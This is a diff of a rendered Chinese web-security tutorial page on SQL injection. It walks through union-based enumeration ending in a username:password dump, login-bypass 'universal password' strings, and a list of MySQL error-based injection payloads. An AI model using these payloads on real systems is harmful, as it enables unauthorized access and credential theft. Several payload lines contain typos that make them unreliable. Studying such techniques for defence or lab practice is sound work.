+<span class="normal"><a href="#__codelineno-19-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-19-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-19-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-19-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-19-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-19-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-19-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-19-10">10</a></span>
+<span class="normal"><a href="#__codelineno-19-11">11</a></span>
+<span class="normal"><a href="#__codelineno-19-12">12</a></span>
+<span class="normal"><a href="#__codelineno-19-13">13</a></span>
+<span class="normal"><a href="#__codelineno-19-14">14</a></span>
+<span class="normal"><a href="#__codelineno-19-15">15</a></span>
+<span class="normal"><a href="#__codelineno-19-16">16</a></span>
+<span class="normal"><a href="#__codelineno-19-17">17</a></span>
+<span class="normal"><a href="#__codelineno-19-18">18</a></span>
+<span class="normal"><a href="#__codelineno-19-19">19</a></span>
+<span class="normal"><a href="#__codelineno-19-20">20</a></span>
+<span class="normal"><a href="#__codelineno-19-21">21</a></span>
+<span class="normal"><a href="#__codelineno-19-22">22</a></span>
+<span class="normal"><a href="#__codelineno-19-23">23</a></span>
+<span class="normal"><a href="#__codelineno-19-24">24</a></span>
+<span class="normal"><a href="#__codelineno-19-25">25</a></span>
+<span class="normal"><a href="#__codelineno-19-26">26</a></span>
+<span class="normal"><a href="#__codelineno-19-27">27</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;                              </span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2"></a><span class="s1">-- [步骤1] 测试是否存在注入点：传入一个闭合引号，若报错，说明后端存在 SQL 拼接，可能可注入</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3"></a>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4"></a><span class="s1">?id=1&#39;</span><span class="c1">-- -                          </span>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5"></a><span class="c1">-- [步骤2] 尝试闭合语句 + 注释掉后续内容：验证是否能成功构造注入，页面是否正常回显</span>
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6"></a>
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; order by n-- -              </span>
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8"></a><span class="s1">-- [步骤3] 使用 order by 测试列数：逐个尝试 n=1,2,3...，直到报错，说明字段数为 n-1</span>
+</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9"></a>
+</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10"></a><span class="s1">?id=-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="c1">-- -     </span>
+</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11"></a><span class="c1">-- [步骤4] 探测回显位置：使用和目标列数相同的虚构查询，查看哪个数字在页面中显示，即是可利用的回显位</span>
+</span><span id="__span-19-12"><a id="__codelineno-19-12" name="__codelineno-19-12"></a>
+</span><span id="__span-19-13"><a id="__codelineno-19-13" name="__codelineno-19-13"></a><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,database()-- - </span>
+</span><span id="__span-19-14"><a id="__codelineno-19-14" name="__codelineno-19-14"></a><span class="s1">-- [步骤5] 利用回显点显示当前数据库名，database() 是 MySQL 中获取当前库名的函数</span>
+</span><span id="__span-19-15"><a id="__codelineno-19-15" name="__codelineno-19-15"></a>
+</span><span id="__span-19-16"><a id="__codelineno-19-16" name="__codelineno-19-16"></a><span class="s1">?id=-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="w"> </span>
+</span><span id="__span-19-17"><a id="__codelineno-19-17" name="__codelineno-19-17"></a><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span><span class="c1">-- -</span>
+</span><span id="__span-19-18"><a id="__codelineno-19-18" name="__codelineno-19-18"></a><span class="c1">-- [步骤6] 利用 group_concat() 把当前数据库下所有表名拼接起来，通过回显位一次性展示出来</span>
+</span><span id="__span-19-19"><a id="__codelineno-19-19" name="__codelineno-19-19"></a><span class="c1">-- information_schema.tables 是系统表，table_schema=database() 表示只查当前数据库</span>
+</span><span id="__span-19-20"><a id="__codelineno-19-20" name="__codelineno-19-20"></a>
+</span><span id="__span-19-21"><a id="__codelineno-19-21" name="__codelineno-19-21"></a><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">&#39; union select 1,2,group_concat(column_name) </span>
+</span><span id="__span-19-22"><a id="__codelineno-19-22" name="__codelineno-19-22"></a><span class="s1">from information_schema.columns where table_name=&#39;</span><span class="n">XXX</span><span class="s1">&#39;-- -</span>
+</span><span id="__span-19-23"><a id="__codelineno-19-23" name="__codelineno-19-23"></a><span class="s1">-- [步骤7] 查找指定表（如 &#39;</span><span class="n">users</span><span class="s1">&#39;）中所有的字段名（如 username、password 等），并拼接显示</span>
+</span><span id="__span-19-24"><a id="__codelineno-19-24" name="__codelineno-19-24"></a>
+</span><span id="__span-19-25"><a id="__codelineno-19-25" name="__codelineno-19-25"></a><span class="s1">?id=-1&#39;</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">password</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">XXX</span><span class="c1">-- -</span>
+</span><span id="__span-19-26"><a id="__codelineno-19-26" name="__codelineno-19-26"></a><span class="c1">-- [步骤8] 从目标表中查询字段内容，0x3a 是十六进制的 “:”（冒号），用于分隔用户名和密码</span>
+</span><span id="__span-19-27"><a id="__codelineno-19-27" name="__codelineno-19-27"></a><span class="c1">-- group_concat() 把多行拼成一行，便于在一个回显位中查看多个值</span>
+</span></code></pre></div></td></tr></table></div>
+<h4 id="2_1">2. 万能密码<a class="headerlink" href="#2_1" title="Permanent link">&para;</a></h4>
 <p><strong>场景：登录页面</strong></p>
-<pre><code class="language-sql">SELECT * FROM users WHERE username = '$user' AND password = '$pass'
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-20-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;$user&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;$pass&#39;</span>
+</span></code></pre></div></td></tr></table></div>
 <p><strong>注入方式</strong></p>
 <p>万能密码输入示例：</p>
-<pre><code class="language-sql">用户名：admin
-密码：' OR '1'='1
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-21-1">1</a></span>
+<span class="normal"><a href="#__codelineno-21-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1"></a><span class="err">用户名：</span><span class="k">admin</span>
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2"></a><span class="err">密码：</span><span class="s1">&#39; OR &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span>
+</span></code></pre></div></td></tr></table></div>
 <p>最终SQL语句：</p>
-<pre><code class="language-sql">SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1'
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-22-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">=</span><span class="s1">&#39;1&#39;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>因为 '1'='1' 永远为真，整条语句就绕过了密码验证。</p>
 <p><strong>万能密码写法：</strong></p>
-<pre><code class="language-sql">' OR 1=1--      ← 最经典的写法
-' OR 'a'='a'--  ← 同理
-' OR 'a'='a     ← 直接闭合语句中原有的单引号
-admin'--        ← 若用户名字段也可注入
-</code></pre>
-<h4 id="3">3. 报错注入</h4>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-23-1">1</a></span>
+<span class="normal"><a href="#__codelineno-23-2">2</a></span>
+<span class="normal"><a href="#__codelineno-23-3">3</a></span>
+<span class="normal"><a href="#__codelineno-23-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1"></a><span class="s1">&#39; OR 1=1--      ← 最经典的写法</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2"></a><span class="s1">&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="c1">--  ← 同理</span>
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3"></a><span class="s1">&#39; OR &#39;</span><span class="n">a</span><span class="s1">&#39;=&#39;</span><span class="n">a</span><span class="w">     </span><span class="err">←</span><span class="w"> </span><span class="err">直接闭合语句中原有的单引号</span>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4"></a><span class="k">admin</span><span class="err">&#39;</span><span class="c1">--        ← 若用户名字段也可注入</span>
+</span></code></pre></div></td></tr></table></div>
+<h4 id="3">3. 报错注入<a class="headerlink" href="#3" title="Permanent link">&para;</a></h4>
 <blockquote>
 <p>报错注入是利用数据库在执行非法或逻辑错误的 SQL 表达式时主动抛出的报错信息，将敏感信息写入报错内容中，从而实现数据泄露。</p>
 </blockquote>
 <p><strong>示例演示过程（基于 MySQL）</strong></p>
-<pre><code class="language-sql">SELECT * FROM users WHERE id = '$id';
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-24-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1"></a><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;$id&#39;</span><span class="p">;</span>
+</span></code></pre></div></td></tr></table></div>
 <p>当我们输入<code>?id=1'</code></p>
 <p>页面报错：<code>You have an error in your SQL syntax</code></p>
 <p>说明存在报错注入利用可能性。</p>
@@ -2999,22 +3049,22 @@ admin'--        ← 若用户名字段也可注入
 <ol>
 <li><strong>基于 updatexml() 的报错注入</strong></li>
 </ol>
-<pre><code class="language-sql">?id=1' and updatexml(1, concat(0x7e, database(), 0x7e), 1)-- -
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-25-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="err">&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="w"> </span><span class="k">database</span><span class="p">(),</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="c1">-- -</span>
+</span></code></pre></div></td></tr></table></div>
 <ul>
 <li>updatexml() 是 MySQL 的 XML 函数</li>
 <li>concat() 用于拼接字符串：0x7e 是 <code>~</code></li>
-<li>最终构造非法 XML，触发报错，错误中就会包含 ~当前数据库名~</li>
+<li>最终构造非法 XML，触发报错，错误中就会包含 <sub>当前数据库名</sub></li>
 </ul>
 <p>页面可能报错如下：</p>
-<pre><code>XPATH syntax error: '~dvwa~'
-</code></pre>
+<div class="language-text highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">Text Only</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-26-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1"></a>XPATH syntax error: &#39;~dvwa~&#39;
+</span></code></pre></div></td></tr></table></div>
 <p><img alt="image-20250628095606069" src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250628095606069.png" /></p>
 <ol>
 <li><strong>基于 extractvalue() 的报错注入</strong></li>
 </ol>
-<pre><code class="language-sql">?id=1' and extractvalue(1, concat(0x7e, (select table_name from information_schema.tables limit 1), 0x7e));
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-27-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="err">&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">));</span>
+</span></code></pre></div></td></tr></table></div>
 <ul>
 <li>extractvalue() 解析 XPath 的 XML 字符串，也会抛出错误</li>
 </ul>
@@ -3022,54 +3072,88 @@ admin'--        ← 若用户名字段也可注入
 <ol>
 <li><strong>基于 floor(rand()*2) 报错（信息泄露型）</strong></li>
 </ol>
-<pre><code class="language-sql">?id=1' and (select 1 from (select count(*), concat((select version()), floor(rand(0)*2)) x from information_schema.tables group by x) y)-- -
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-28-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1"></a><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="err">&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="w"> </span><span class="n">concat</span><span class="p">((</span><span class="k">select</span><span class="w"> </span><span class="k">version</span><span class="p">()),</span><span class="w"> </span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">x</span><span class="p">)</span><span class="w"> </span><span class="n">y</span><span class="p">)</span><span class="c1">-- -</span>
+</span></code></pre></div></td></tr></table></div>
 <ul>
 <li>利用 group by + rand() 重复值触发 “Duplicate entry” 报错</li>
 <li>报错中包含数据库版本号</li>
 </ul>
 <p><img alt="image-20250628095751221" src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250628095751221.png" /></p>
-<pre><code class="language-sql"># 通过floor报错,注入语句如下:
-and select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
- 
-# 通过ExtractValue报错,注入语句如下:
-and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));
- 
-# 通过UpdateXml报错,注入语句如下:
-and 1=(updatexml(1,concat(0x7e,(select user()),0x7e),1))
- 
-# 通过NAME_CONST报错,注入语句如下:
-and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)
- 
-# 通过join报错,注入语句如下:
-select * from(select * from mysql.user ajoin mysql.user b)c;
- 
-# 通过exp报错,注入语句如下:
-and exp(~(select * from (select user () ) a) );
- 
-# 通过GeometryCollection()报错,注入语句如下:
-and GeometryCollection(()select *from(select user () )a)b );
- 
-# 通过polygon ()报错,注入语句如下:
-and polygon (()select * from(select user ())a)b );
- 
-# 通过multipoint ()报错,注入语句如下:
-and multipoint (()select * from(select user() )a)b );
- 
-# 通过multlinestring ()报错,注入语句如下:
-and multlinestring (()select * from(selectuser () )a)b );
- 
-# 通过multpolygon ()报错,注入语句如下:
-and multpolygon (()select * from(selectuser () )a)b );
- 
-# 通过linestring ()报错,注入语句如下:
-and linestring (()select * from(select user() )a)b );
-</code></pre>
+<div class="language-sql highlight"><table class="highlighttable"><tr><th colspan="2" class="filename"><span class="filename">SQL</span></th></tr><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-29-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-29-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-29-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-29-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-29-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-29-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-29-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-29-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-29-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-29-10">10</a></span>
+<span class="normal"><a href="#__codelineno-29-11">11</a></span>
+<span class="normal"><a href="#__codelineno-29-12">12</a></span>
+<span class="normal"><a href="#__codelineno-29-13">13</a></span>
+<span class="normal"><a href="#__codelineno-29-14">14</a></span>
+<span class="normal"><a href="#__codelineno-29-15">15</a></span>
+<span class="normal"><a href="#__codelineno-29-16">16</a></span>
+<span class="normal"><a href="#__codelineno-29-17">17</a></span>
+<span class="normal"><a href="#__codelineno-29-18">18</a></span>
+<span class="normal"><a href="#__codelineno-29-19">19</a></span>
+<span class="normal"><a href="#__codelineno-29-20">20</a></span>
+<span class="normal"><a href="#__codelineno-29-21">21</a></span>
+<span class="normal"><a href="#__codelineno-29-22">22</a></span>
+<span class="normal"><a href="#__codelineno-29-23">23</a></span>
+<span class="normal"><a href="#__codelineno-29-24">24</a></span>
+<span class="normal"><a href="#__codelineno-29-25">25</a></span>
+<span class="normal"><a href="#__codelineno-29-26">26</a></span>
+<span class="normal"><a href="#__codelineno-29-27">27</a></span>
+<span class="normal"><a href="#__codelineno-29-28">28</a></span>
+<span class="normal"><a href="#__codelineno-29-29">29</a></span>
+<span class="normal"><a href="#__codelineno-29-30">30</a></span>
+<span class="normal"><a href="#__codelineno-29-31">31</a></span>
+<span class="normal"><a href="#__codelineno-29-32">32</a></span>
+<span class="normal"><a href="#__codelineno-29-33">33</a></span>
+<span class="normal"><a href="#__codelineno-29-34">34</a></span>
+<span class="normal"><a href="#__codelineno-29-35">35</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1"></a><span class="o">#</span><span class="w"> </span><span class="err">通过</span><span class="n">floor报错</span><span class="p">,</span><span class="err">注入语句如下</span><span class="p">:</span>
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2"></a><span class="k">and</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="n">concat</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">x</span><span class="p">)</span><span class="n">a</span><span class="p">);</span>
+</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3"></a><span class="w"> </span>
+</span><span id="__span-29-4"><a id="__codelineno-29-4" name="__codelineno-29-4"></a><span class="o">#</span><span class="w"> </span><span class="err">通过</span><span class="n">ExtractValue报错</span><span class="p">,</span><span class="err">注入语句如下</span><span class="p">:</span>
+</span><span id="__span-29-5"><a id="__codelineno-29-5" name="__codelineno-29-5"></a><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x5c</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">1</span><span class="p">)));</span>
+</span><span id="__span-29-6"><a id="__codelineno-29-6" name="__codelineno-29-6"></a><span class="w"> </span>
+</span><span id="__span-29-7"><a id="__codelineno-29-7" name="__codelineno-29-7"></a><span class="o">#</span><span class="w"> </span><span class="err">通过</span><span class="n">UpdateXml报错</span><span class="p">,</span><span class="err">注入语句如下</span><span class="p">:</span>
+</span><span id="__span-29-8"><a id="__codelineno-29-8" name="__codelineno-29-8"></a><span class="k">and</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="p">()),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">))</span>
+</span><span id="__span-29-9"><a id="__codelineno-29-9" name="__codelineno-29-9"></a><span class="w"> </span>
+</span><span id="__span-29-10"><a id="__codelineno-29-10" name="__codelineno-29-10"></a><span class="o">#</span><span class="w"> </span><span class="err">通过</span><span class="n">NAME_CONST报错</span><span class="p">,</span><span class="err">注入语句如下</span><span class="p">:</span>
+</span><span id="__span-29-11"><a id="__codelineno-29-11" name="__codelineno-29-11"></a><span class="k">and</span><span class="w"> </span><span class="k">exists</span><span class="p">(</span><span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="o">*</span><span class="k">from</span><span class="p">(</span><span class="n">selectname_const</span><span class="p">(</span><span class="o">@@</span><span class="k">version</span><span class="p">,</span><span class="mi">0</span><span class="p">))</span><span class="n">a</span><span class="w"> </span><span class="k">join</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">name_const</span><span class="p">(</span><span class="o">@@</span><span class="k">version</span><span class="p">,</span><span class="mi">0</span><span class="p">))</span><span class="n">b</span><span class="p">)</span><span class="k">c</span><span class="p">)</span>
+</span><span id="__span-29-12"><a id="__codelineno-29-12" name="__codelineno-29-12"></a><span class="w"> </span>
+</span><span id="__span-29-13"><a id="__codelineno-29-13" name="__codelineno-29-13"></a><span class="o">#</span><span class="w"> </span><span class="err">通过</span><span class="n">join报错</span><span class="p">,</span><span class="err">注入语句如下</span><span class="p">:</span>
+</span><span id="__span-29-14"><a id="__codelineno-29-14" name="__codelineno-29-14"></a><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="n">ajoin</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="n">b</span><span class="p">)</span><span class="k">c</span><span class="p">;</span>
+</span><span id="__span-29-15"><a id="__codelineno-29-15" name="__codelineno-29-15"></a><span class="w"> </span>
+</span><span id="__span-29-16"><a id="__codelineno-29-16" name="__codelineno-29-16"></a><span class="o">#</span><span class="w"> </span><span class="err">通过</span><span class="n">exp报错</span><span class="p">,</span><span class="err">注入语句如下</span><span class="p">:</span>
+</span><span id="__span-29-17"><a id="__codelineno-29-17" name="__codelineno-29-17"></a><span class="k">and</span><span class="w"> </span><span class="n">exp</span><span class="p">(</span><span class="o">~</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="n">a</span><span class="p">)</span><span class="w"> </span><span class="p">);</span>
+</span><span id="__span-29-18"><a id="__codelineno-29-18" name="__codelineno-29-18"></a><span class="w"> </span>
+</span><span id="__span-29-19"><a id="__codelineno-29-19" name="__codelineno-29-19"></a><span class="o">#</span><span class="w"> </span><span class="err">通过</span><span class="n">GeometryCollection</span><span class="p">()</span><span class="err">报错</span><span class="p">,</span><span class="err">注入语句如下</span><span class="p">:</span>
+</span><span id="__span-29-20"><a id="__codelineno-29-20" name="__codelineno-29-20"></a><span class="k">and</span><span class="w"> </span><span class="n">GeometryCollection</span><span class="p">(()</span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="k">from</span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">)</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="w"> </span><span class="p">);</span>
+</span><span id="__span-29-21"><a id="__codelineno-29-21" name="__codelineno-29-21"></a><span class="w"> </span>
+</span><span id="__span-29-22"><a id="__codelineno-29-22" name="__codelineno-29-22"></a><span class="o">#</span><span class="w"> </span><span class="err">通过</span><span class="n">polygon</span><span class="w"> </span><span class="p">()</span><span class="err">报错</span><span class="p">,</span><span class="err">注入语句如下</span><span class="p">:</span>
